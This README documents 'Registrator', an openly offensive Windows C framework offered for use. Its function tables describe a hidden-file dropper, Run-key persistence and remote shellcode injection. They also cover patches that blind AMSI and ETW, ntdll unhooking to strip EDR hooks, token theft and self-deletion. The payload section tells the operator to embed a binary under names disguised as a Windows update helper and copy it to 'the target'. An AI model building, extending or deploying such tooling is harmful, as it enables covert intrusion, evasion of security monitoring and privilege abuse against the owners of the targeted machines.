# Registrator

A C framework of WinAPI wrappers targeting **Windows x64**. Provides reusable,
self-contained building blocks for interacting with the Windows system —
registry, services, processes, tokens, memory, and evasion primitives. No
third-party dependencies; WinAPI only.

---

## Structure

```
registrator/
│
├── include/
│   ├── core/
│   │   └── payload.h           # Embedded payload declaration
│   └── utils/
│       ├── logger.h            # Log levels, print_banner(), pretty_print()
│       ├── registry.h          # Registry CRUD + Run-key persistence
│       ├── service.h           # Windows service lifecycle (SCM wrappers)
│       ├── system.h            # Elevation check, elevation_status_t
│       ├── thread.h            # Process spawning (plain / hardened),
│       │                       #   shellcode injection, thread table
│       ├── dropper.h           # Write bytes to disk, temp-path resolution,
│       │                       #   self-delete scheduling
│       ├── evasion.h           # AMSI / ETW patch, ntdll unhook,
│       │                       #   blockdlls, kernel MitigationOptions
│       ├── process.h           # Process enumeration / termination,
│       │                       #   VAD + thread-start injection scanner
│       └── token.h             # Privilege management, token theft,
│                               #   impersonation, spawn-as-token
│
├── src/
│   ├── core/
│   │   ├── main.c              # Entry point
│   │   └── payload.c           # Embedded payload bytes (operator fills in)
│   └── utils/
│       ├── logger.c
│       ├── registry.c
│       ├── service.c
│       ├── system.c
│       ├── thread.c
│       ├── dropper.c
│       ├── evasion.c
│       ├── process.c
│       └── token.c
│
└── Makefile
```

### Dependency rule

```
core  →  utils  →  (stdlib / WinAPI only)
```

`utils/` headers never `#include` anything from `core/`. If a utility needs a
type or constant that lives in `core/`, it belongs in `core/` instead.

---

## Module reference

### `logger`

| Function | Description |
|---|---|
| `print_banner()` | Print tool name, version, author |
| `pretty_print(level, fmt, ...)` | Prefixed, coloured log line (`LOG_INFO` `LOG_SUCCESS` `LOG_WARNING` `LOG_ERROR`) |
| `print_binary_data(data, size)` | Hex dump of a byte buffer |

---

### `registry`

| Function | Description |
|---|---|
| `set_registry_key(hive, path, name, data, size, type)` | Create-or-open key and write a typed value |
| `get_registry_key(hive, path, name, &size, &type)` | Read value into a heap buffer — caller must `free()` |
| `append_registry_value(hive, path, name, data, size)` | Append bytes to an existing value, preserving its type |
| `delete_registry_value(hive, path, name)` | Delete a named value from a key |
| `delete_registry_key(hive, path)` | Delete a key and all its values (`KEY_WOW64_64KEY`) |
| `registry_value_exists(hive, path, name)` | Returns `1` if the value exists, `0` otherwise |
| `set_run_key(name, binPath)` | Write `HKCU\...\Run\<name>` for logon persistence (no admin required) |
| `remove_run_key(name)` | Remove a `HKCU\...\Run` entry — idempotent |

---

### `service`

| Function | Description |
|---|---|
| `create_service(name, display, path, startType)` | Register a new service with the SCM |
| `start_service(name)` | Start and poll until `SERVICE_RUNNING` |
| `stop_service(name)` | Stop and poll until `SERVICE_STOPPED` |
| `delete_service(name)` | Remove from the SCM database (must be stopped first) |
| `modify_service(name, display, path, startType)` | Update an existing service configuration |

---

### `system`

| Function | Description |
|---|---|
| `is_elevated()` | Returns `ELEVATION_ELEVATED`, `ELEVATION_NOT_ELEVATED`, or `ELEVATION_ERROR` via `CheckTokenMembership` against the built-in Administrators SID |

---

### `thread`

| Function | Description |
|---|---|
| `spawn_binary(path, args, &slot)` | `CreateProcess` with `CREATE_NO_WINDOW` + `SW_HIDE` |
| `spawn_binary_hardened(path, args, &slot)` | Same + `PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY` blocking non-Microsoft DLL injection into the child |
| `spawn_command(cmd, &slot)` | Hidden `cmd.exe /c <cmd>` resolved via `COMSPEC` |
| `inject_shellcode(pid, bytes, size, &slot)` | `VirtualAllocEx(RW)` → `WriteProcessMemory` → `VirtualProtectEx(RX)` → `CreateRemoteThread` |
| `thread_suspend(slot)` | `SuspendThread` on tracked entry |
| `thread_resume(slot)` | `ResumeThread` on tracked entry |
| `thread_kill(slot)` | `TerminateProcess` (BINARY/COMMAND) or `TerminateThread` (REMOTE) |
| `thread_wait(slot, ms)` | `WaitForSingleObject` with timeout; returns `0` (exited), `1` (timeout), `-1` (error) |
| `thread_list()` | Print the full tracking table with current status |
| `thread_cleanup()` | Close handles and free slots for completed / terminated entries |
| `thread_register(hProc, hThread, pid, tid, type, label, &slot)` | Register an externally-created process into the tracking table |

---

### `dropper`

| Function | Description |
|---|---|
| `drop_binary(path, data, size)` | Write bytes to disk with `FILE_ATTRIBUTE_HIDDEN` via `CreateFile/WriteFile` |
| `drop_and_execute(path, data, size, args, &slot)` | `drop_binary` + `spawn_binary` in one call |
| `resolve_temp_path(filename, buf, size)` | Resolve `%TEMP%\<filename>` via `GetTempPathA` |
| `self_delete(path)` | Schedule file deletion by spawning a detached `cmd /c ping -n 3 ... & del` child |

---

### `evasion`

| Function | Description |
|---|---|
| `patch_amsi()` | Overwrite `amsi!AmsiScanBuffer` prologue with `xor eax,eax; ret` — forces `AMSI_RESULT_CLEAN` |
| `patch_etw()` | Overwrite `ntdll!EtwEventWrite` prologue with `xor eax,eax; ret` — suppresses all user-mode ETW emission from this process |
| `unhook_ntdll()` | Map ntdll from disk with `SEC_IMAGE`, overwrite the in-memory `.text` section to remove EDR inline hooks |
| `enable_blockdlls()` | `SetProcessMitigationPolicy(MicrosoftSignedOnly)` on the current process — prevents EDR DLL injection; permanent for process lifetime; requires Windows 8+ |
| `set_mitigation_policy()` | Write `HKLM\...\kernel\MitigationOptions` to enforce Microsoft-signed-only kernel module loading (admin required, takes effect after reboot) |
| `unset_mitigation_policy()` | Reset `MitigationOptions` to the Windows default WHQL-signed level |

---

### `process`

| Function | Description |
|---|---|
| `find_pid_by_name(name)` | Exact name match (case-insensitive) via `CreateToolhelp32Snapshot` |
| `find_pid_containing(substr)` | First PID whose name contains `substr` (case-insensitive) |
| `list_processes()` | Print table of all running processes (PID, PPID, session, name) |
| `kill_process_by_pid(pid)` | `OpenProcess(PROCESS_TERMINATE)` + `TerminateProcess` |
| `kill_process_by_name(name)` | `find_pid_by_name` + `kill_process_by_pid` |
| `scan_process_injections(pid)` | VAD scan — flags `MEM_PRIVATE` + `PAGE_EXECUTE*` regions not backed by a file. Pass `0` to scan all accessible processes |
| `scan_thread_injections(pid)` | Retrieves thread start addresses via `NtQueryInformationThread(ThreadQuerySetWin32StartAddress)`, flags those resolving outside `MEM_IMAGE` memory. Pass `0` to scan all |

---

### `token`

| Function | Description |
|---|---|
| `enable_privilege(name)` | Enable a named privilege in the current process token (`SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.) |
| `disable_privilege(name)` | Remove a privilege from the current process token |
| `steal_token(pid)` | `OpenProcessToken` + `DuplicateTokenEx(TokenPrimary)` — returns caller-owned `HANDLE` |
| `impersonate_token(hToken)` | `ImpersonateLoggedOnUser` on the current thread; accepts primary or impersonation tokens |
| `revert_impersonation()` | `RevertToSelf` |
| `spawn_as_token(hToken, path, args, &slot)` | `CreateProcessAsUserA` under a stolen token; result registered in the thread table |
| `print_token_info(hToken)` | Print user account (`DOMAIN\user`), token type, integrity level, and elevation flag |

---

## Embedding a payload

Edit `src/core/payload.c` and replace the placeholder array with your binary's
bytes. Helpers to generate it:

```bash
# Linux — xxd
xxd -i payload.exe

# Python
python3 -c "
d = open('payload.exe','rb').read()
print('const BYTE PAYLOAD_DATA[] = {' + ','.join(hex(b) for b in d) + '};')
print(f'const SIZE_T PAYLOAD_SIZE = {len(d)};')
"
```

Adjust the drop filename and Run-key label in `include/core/payload.h`:

```c
#define PAYLOAD_FILENAME     "update_helper.exe"
#define PAYLOAD_RUN_KEY_NAME "WindowsUpdateHelper"
```

---

## Building

The Makefile discovers all `.c` files under `src/core/` and `src/utils/`
automatically — no manual source list to maintain.

### Make targets

| Target | Output |
|---|---|
| `make` | Debug build → `registrator.exe` |
| `make release` | Static, stripped release build |
| `make CC=x86_64-w64-mingw32-gcc` | Cross-compile from Linux (debug) |
| `make release CC=x86_64-w64-mingw32-gcc` | Cross-compile from Linux (release) |
| `make check` | Verify only system DLLs are linked (requires `objdump`) |
| `make clean` | Remove `build/` and `registrator.exe` |

---

### Windows — MinGW-w64

Install [MinGW-w64](https://www.mingw-w64.org/), then:

```bash
make           # debug
make release   # static + stripped, no runtime dependencies
```

---

### Linux — cross-compilation

Install the toolchain:

```bash
# Debian / Ubuntu
sudo apt install mingw-w64

# Arch
sudo pacman -S mingw-w64-gcc

# Fedora
sudo dnf install mingw64-gcc
```

Build:

```bash
make CC=x86_64-w64-mingw32-gcc                  # debug
make release CC=x86_64-w64-mingw32-gcc          # static + stripped
```

The output `registrator.exe` is a native Windows x64 PE binary. Copy it
directly to the target — no installer or runtime required.

---

### Verifying DLL dependencies

After any build, confirm only Windows system DLLs are linked:

```bash
make check
# equivalent to:
x86_64-w64-mingw32-objdump -p registrator.exe | grep "DLL Name"
```

Expected output:

```
DLL Name: KERNEL32.dll
DLL Name: msvcrt.dll
DLL Name: ADVAPI32.dll
```

Any MinGW runtime DLL (`libgcc_s_seh-1.dll`, `libwinpthread-1.dll`, etc.)
appearing here means the static flags were not applied — use `make release`.

---

## Runtime requirements

| | |
|---|---|
| **Target OS** | Windows x64 |
| **Privileges** | Administrator required for HKLM writes, service management, cross-session token operations, and kernel mitigation policy changes. Drop, Run-key persistence, and process spawning work without elevation. |
| **Dependencies** | None — `advapi32`, `kernel32`, `ntdll` (all guaranteed present on every Windows installation) |
